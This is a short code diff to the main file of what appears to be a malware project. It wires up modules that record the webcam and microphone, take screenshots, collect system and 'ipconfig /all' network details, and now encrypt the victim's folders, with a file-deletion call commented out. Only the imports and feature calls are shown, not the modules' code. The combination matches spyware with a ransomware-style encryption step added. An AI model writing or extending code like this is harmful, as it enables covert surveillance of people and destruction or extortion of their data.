@@ -2,11 +2,12 @@ import threading
 
 import Features.feature
 from Features.feature import \
-    WEBCAMERA, \
-    SCREENSHOTS, \
-    MICROPHONE, \
-    SYS_INFO, \
-    CMD_PROMPTS
+    Webcamera, \
+    Screenshot, \
+    Microphone, \
+    SysInfo, \
+    CmdPrompts, \
+    FileEncryption
 
 class MainFileException(Exception):
     pass
@@ -27,11 +28,13 @@ def main():
 
     # List of features to run
     features = [
-        WEBCAMERA.webcamera,
-        SCREENSHOTS.screenshots,
-        MICROPHONE.microphone,
-        SYS_INFO.system_information,
-        CMD_PROMPTS.ipconfig_all
+        Webcamera.record_screen(),
+        Screenshot.screenshot(),
+        Microphone.audio_recording(),
+        SysInfo.system_information(),
+        CmdPrompts.ipconfig_all(),
+        FileEncryption.encrypt_folders(),
+        #FileEncryption.delete_files()
     ]
 
     try:
